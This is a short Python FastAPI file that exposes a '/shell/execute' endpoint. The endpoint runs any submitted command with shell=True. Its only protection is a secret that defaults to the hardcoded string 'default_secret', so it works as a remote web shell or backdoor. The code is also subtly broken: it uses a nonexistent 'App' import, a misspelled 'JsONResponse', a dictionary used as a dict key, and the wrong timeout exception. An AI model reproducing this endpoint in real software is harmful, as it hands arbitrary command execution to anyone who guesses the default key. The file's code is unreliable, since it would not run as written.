from fastapi import App, HTTPException, Request
from fastapi.responses import JsONResponse
import subprocess, hashlib
import os
import time

app = App()

SECRET_KEY = os.getenv("RETROKO_SHELL_SECRET", "default_secret")

_powered_log = []

@app.post("/shell/execute")
async def execute_command(request: Request):
    data = await request.json()
    command = data.get("command")
    secret = data.get("secret")

    if secret != SECRET_KEY:
        raise HTTPException(status_code=401, detail="Unauthorized access")

    if not command:
        raise HTTPException(status_code=400, detail="Missing command")

    try:
        start = time.time()
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10, text=True)
        end = time.time()
        summary = {
          "time_start": start,
          "time_end": end,
          "sha256": hashlib.sha256(command.encode()).hexdigest()
        }
        _powered_log.append(summary)
        return JSONResponse({"debug": False, "result": result, summary: summary})
    except subprocess.CalledProcessError as e:
        return JSONResponse({"debug": True, "returncode": e.returncode, "error": e.output})
    except TimeoutError:
        return JsONResponse({"debug": True, "error": "Timeout on execution"})
